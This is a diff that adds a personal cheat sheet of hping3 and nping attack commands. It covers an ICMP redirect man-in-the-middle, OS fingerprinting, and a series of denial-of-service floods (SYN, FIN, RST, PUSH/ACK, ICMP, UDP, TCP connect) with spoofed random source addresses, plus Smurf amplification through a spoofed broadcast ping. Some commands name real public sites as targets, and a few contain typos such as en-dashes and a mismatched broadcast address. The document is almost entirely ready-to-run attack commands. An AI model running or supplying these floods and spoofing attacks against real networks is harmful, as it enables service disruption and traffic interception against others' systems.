@@ -1,0 +1,81 @@
+#ICMP redirect MITM attack
+/etc/sysctl.conf
+net.ipv4.conf.all.accept_redirects = 0
+hping3 -I eth0 -C 5 -K 1 -a 10.0.2.2 --icmp-ipdst 8.8.8.8 --icmp-gw 10.0.2.15 --icmp-ipsrc 10.0.2.16
+
+#operating system detection w ICMP packages
+hping3 -1 -c 1 –K 58 10.0.2.16
+hping3 -a 10.1.1.1 -p 80 -S www.alibaba.com
+hping3 -S 192.168.1.105 -p 80
+hping -S 192.168.1.105 -p ++1
+hping3 -f 192.168.1.105 -p 80
+
+   
+# -d is the data payload size (here, we've designated it as 10 bytes)
+# -E tells hping3 to grab data from the following file
+hping3 -f 192.168.1.105 -p 80 -d 10 -E malware
+
+# -z connects the command to the ctrl z on the keyboard so that every time we press it, the TTL is incremented by 1
+# -t sets the initial TTL (in this case, we're using 1)
+# -S sets the flag to SYN
+# -p 80 sets the destination port to 80
+hping3 -z -t 1 -S google.com -p 80
+    
+
+
+DoS using hping3 with random source IP
+-c 100000 = Number of packets to send.
+-d 120 = Size of each packet that was sent to target machine.
+-S = I am sending SYN packets only.
+-w 64 = TCP window size.
+-p 21 = Destination port (21 being FTP port). You can use any port here.
+--flood = Sending packets as fast as possible, without taking care to show incoming replies. Flood mode.
+--rand-source = Using Random Source IP Addresses. You can also use -a or –spoof to hide hostnames. See MAN page below.
+www.hping3testsite.com = Destination IP address/website name 
+$hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com
+
+#SYN flood – DoS using HPING3
+hping3 -S --flood -V www.hping3testsite.com
+
+Advanced SYN flood with random source IP, different data size, and window size
+hping3 -c 20000 -d 120 -S -w 64 -p TARGET_PORT --flood --rand-source TARGET_SITE
+–flood: sent packets as fast as possible
+–rand-source: random source address
+-c –count: packet count
+-d –data: data size
+-S –syn: set SYN flag
+-w –win: winsize (default 64)
+-p –destport: destination port (default 0)
+$hping3 -S --flood -V -p TARGET_PORT TARGET_SITE
+
+
+FIN floods
+$hping3 --flood --rand-source -F -p TARGET_PORT TARGET_IP
+TCP RST Flood
+$hping3 --flood --rand-source -R -p TARGET_PORT TARGET_IP
+PUSH and ACK Flood
+$hping3 --flood --rand-source -PA -p TARGET_PORT TARGET_IP
+ICMP flood
+$hping3 --flood --rand-source -1 -p TARGET_PORT TARGET_IP
+UDP Flood
+–flood: sent packets as fast as possible
+–rand-source: random source address
+–udp: UDP mode
+-p –destport: destination port (default 0)
+$hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP
+SYN flood with spoofed IP – DoS using HPING3
+$hping3 -S -P -U --flood -V --rand-source www.hping3testsite.com
+TCP connect flood – DoS using NPING
+$nping --tcp-connect -rate=90000 -c 900000 -q www.hping3testsite.com    
+    
+    
+use routers broadcast IP address feature to send messages to multiple IP addresses 
+use connection-less protocols that do not validate source IP addresses.
+amplification techniques;Smurf attack(ICMP amplification), DNS amplification, and Fraggle attack(UDP amplification)
+    
+
+Smurf Attack
+This command sends ping requests to broadcast IP(10.10.15.255) by spoofing target IP(10.10.15.152). 
+All running hosts in this network reply to the target.
+$hping3 --icmp --spoof TARGET_IP BROADCAST_IP
+$hping3 --icmp --spoof 10.10.15.152 10.10.15.25
